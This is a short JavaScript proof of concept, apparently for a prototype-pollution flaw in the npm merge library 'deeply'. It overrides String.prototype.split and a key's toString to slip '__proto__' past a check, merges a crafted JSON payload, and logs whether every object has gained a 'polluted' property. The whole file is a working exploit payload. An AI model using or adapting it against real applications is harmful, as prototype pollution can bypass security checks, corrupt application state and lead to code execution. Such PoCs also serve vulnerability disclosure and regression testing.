var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const mergeFn = require('deeply');
const payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
var obj = {};
console.log({}.polluted);
mergeFn({}, JSON.parse(payload));
console.log({}.polluted);